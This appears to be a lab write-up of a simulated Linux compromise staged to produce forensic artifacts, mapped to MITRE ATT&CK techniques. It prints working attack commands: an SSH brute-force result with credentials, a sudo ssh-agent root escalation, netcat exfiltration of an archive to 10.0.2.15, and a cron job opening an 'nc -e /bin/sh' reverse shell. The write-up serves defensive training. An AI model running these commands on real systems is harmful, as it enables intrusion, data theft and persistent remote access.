# Initial Compromise

## Overview

The initial compromise phase simulated a realistic external attacker attempting to gain unauthorized access to a Linux host.

The attack chain consisted of:

1. Reconnaissance against the target host
2. SSH credential brute-force attack
3. Successful authentication using compromised credentials
4. Privilege escalation through a misconfigured sudo permission
5. Sensitive data collection and exfiltration simulation
6. Persistence establishment through a scheduled task

The objective of this phase was to generate realistic attacker activity and create forensic artifacts that could later be analyzed from a defensive perspective.

---

# Initial Access

## SSH Credential Attack

The attacker began by performing credential discovery against the SSH service exposed on the target machine.

Hydra was used with a list of probable usernames combined with a commonly used password dictionary.

The attack successfully identified valid credentials:
Username:  
auditor

Password:  
cristianoronaldo

The successful authentication provided the attacker with an initial foothold on the target system.

### Evidence Generated

- SSH authentication logs
- Network traffic captured in PCAP files
- Successful login event

Relevant MITRE ATT&CK Technique:
T1110.001 - Brute Force: Password Guessing  
T1078 - Valid Accounts

---

# Privilege Escalation

After obtaining access, the attacker performed local enumeration to identify available privilege escalation paths.

The following command was executed:
```
sudo -l
```

![[Screenshot_2026-07-12_14-26-24.png]]

The output revealed that the compromised user account had permission to execute:
```
(root) /usr/bin/ssh-agent
```

without requiring additional restrictions.

The attacker identified that this binary could be abused through a GTFOBins technique to obtain a root shell.

The following command was executed:
```
sudo /usr/bin/ssh-agent /bin/sh
```

The attacker successfully escalated privileges:
```
# whoami
root
```

At this point, the attacker had full administrative control over the host.

### Evidence Generated

- sudo execution logs
- Process execution artifacts
- Privileged shell activity

Relevant MITRE ATT&CK Technique:
T1548 - Abuse Elevation Control Mechanism

---

# Data Collection and Exfiltration Simulation

After gaining root privileges, the attacker searched for sensitive files stored on the system.

A simulated sensitive data archive was identified:
```
/root/sensitive-data.7z
```

The attacker transferred the archive to an external system using Netcat:
```
nc 10.0.2.15 12345 < sensitive-data.7z
```

A hash was generated to verify the transferred file:
```
# md5sum sensitive-data.7z
fac98bb688c5c95082717b0e2d0cc702
```

This simulated the attacker objective of collecting and removing sensitive information from the compromised host.

### Evidence Generated

- Network traffic capture
- Process execution logs
- File access activity

Relevant MITRE ATT&CK Techniques:
T1005 - Data from Local System
T1041 - Exfiltration Over C2 Channel

---

# Persistence Establishment

To simulate maintaining long-term access, the attacker configured a cron job.

The following scheduled task was created:
```
* * * * * nc -e /bin/sh 10.0.2.15 12345
```

This would periodically initiate a reverse shell connection back to the attacker-controlled system.

The persistence mechanism allowed the attacker to regain access even after the original SSH session ended.

### Evidence Generated

- Cron configuration changes
- Suspicious outbound network connections
- Process execution events

Relevant MITRE ATT&CK Technique:
```
T1053.003 - Scheduled Task/Job: Cron
```

---

# Attack Phase Summary

The simulated attack successfully demonstrated a complete compromise lifecycle:

| Phase | Result |
|-|-|
| Reconnaissance | Target services identified |
| Initial Access | SSH credentials compromised |
| Privilege Escalation | Root access obtained |
| Data Collection | Sensitive archive identified |
| Exfiltration | Data transfer simulated |
| Persistence | Cron-based persistence deployed |

The resulting artifacts were preserved for the following investigation phases, where the incident is analyzed from a defensive and detection engineering perspective.